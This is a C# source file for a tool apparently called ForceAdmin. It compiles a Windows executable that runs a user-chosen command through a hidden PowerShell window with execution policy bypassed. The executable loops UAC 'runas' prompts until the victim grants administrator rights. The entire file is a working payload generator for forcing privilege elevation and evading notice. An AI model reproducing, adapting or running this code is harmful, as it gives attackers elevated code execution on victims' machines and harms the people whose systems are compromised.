using Microsoft.CSharp;
using System.CodeDom.Compiler;
using Logger;

public class CatzSec
{   
    
    static void generate_payload(string output, string payload){
        Dictionary<string, string> providerOptions = new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } };
        CSharpCodeProvider codeProvider = new CSharpCodeProvider(providerOptions);
        ICodeCompiler icc = codeProvider.CreateCompiler();
        System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
        parameters.GenerateExecutable = true;
        parameters.OutputAssembly = output;
        parameters.ReferencedAssemblies.Add("System.dll");
        parameters.ReferencedAssemblies.Add("System.Core.dll");
        parameters.ReferencedAssemblies.Add("System.Data.dll");
        parameters.TreatWarningsAsErrors = false;
        parameters.CompilerOptions = "";
        string[] source = new string[] {"using System.Diagnostics;\nclass Program{\nstatic void Main(string[] args)\n{\nSystem.Diagnostics.Process.Start(\"powershell\", \" " + payload + "\");\n}\n}" };
        CompilerResults results = icc.CompileAssemblyFromSourceBatch(parameters, source);
        if (results.Errors.Count > 0)
        {
            foreach (CompilerError CompErr in results.Errors)
            {
                Console.WriteLine("Line number " + CompErr.Line +
                ", Error Number: " + CompErr.ErrorNumber +
                ", '" + CompErr.ErrorText + ";");
            }
        }
    }
    static void Main(string[] args)
    {
        Console.WriteLine(@"
------------------------------------------------------
        ___   __  ____  ____  ____  ____  ___ 
       / __) / _\(_  _)(__  )/ ___)(  __)/ __)
      ( (__ /    \ )(   / _/ \___ \ ) _)( (__ 
       \___)\_/\_/(__) (____)(____/(____)\___) 
        
                Project: ForceAdmin
         Author: https://github.com/catzsec/
------------------------------------------------------

");
        string outfile = logger.Ask("Enter the output file name");
        if (outfile.EndsWith(".exe") == false){
            outfile = outfile + ".exe";
        }
        string payload = logger.Ask("Enter the window command to be executed").Replace("\"", "\\\"").Replace("'", "''");
        var arguments = "-NoLogo -NoProfile -Noninteractive -WindowStyle hidden -ExecutionPolicy bypass";
        if (logger.Ask("Would you like to configure the ForceAdmin powershell command? (Y/N)").ToLower() == "y"){
            logger.Log("Please wait for the arguments to be loaded into the input dialouge");
            arguments = logger.CustomAsk("Edit the powershell arguments", arguments);
        }
        string command = arguments + "-Command \\\"while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/c " + payload + "';exit}catch{}} \\\" ";
        logger.Log("Generating payload...");
        generate_payload(outfile, command);
        logger.Log("Payload generated!");
        
    }

}